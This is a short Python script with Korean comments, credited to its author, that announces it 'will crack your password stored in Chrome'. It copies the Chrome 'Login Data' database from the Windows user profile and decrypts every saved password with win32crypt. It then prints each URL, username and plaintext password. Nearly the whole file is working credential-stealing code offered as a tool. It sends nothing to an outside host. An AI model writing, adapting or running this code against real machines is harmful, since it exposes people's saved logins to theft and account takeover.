import sqlite3  #비밀번호 저장 db에 접근
import shutil #파일복붙
from time import sleep # 멋
import os
from os.path import expanduser # $username
import win32crypt # 암호화 해제


for i in reversed(range(1,2)):
    print()
    print()
    print("Made By Ji-A-Kang")
    print("It will crack your password stored in Chrome")
    print("Wait "+str(i)+" Seconds")
    print()
    print()
    sleep(1)
    print(chr(27) + "[2J")


home = home = expanduser("~")
path = home+'\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'

print("Home Path= "+home)
print("Data Path= "+path) 

os.chdir(path)
print("Current Path= ",os.getcwd())
sleep(1)

shutil.copy('Login Data','LoginDataForCrack.db')


conn = sqlite3.connect("LoginDataForCrack.db")
cursor = conn.cursor()
cursor.execute("SELECT id,origin_url,username_value,password_value FROM logins")
rows = cursor.fetchall()
datalist=list(rows)
dec_pw_list = []
i=0


for data in datalist:
    index = datalist.index(data)
    dec_password = win32crypt.CryptUnprotectData(data[3], None, None, None, 0)[1]  # 크롬 비밀번호 보관(암호화) 방식: win32crpyt
    dec_password = dec_password.decode('utf-8')
    datalist[index] = (data[0], "URL: "+ data[1], "ID: "+ data[2], "PASSWORD: "+dec_password)

for row in datalist:
    print(row)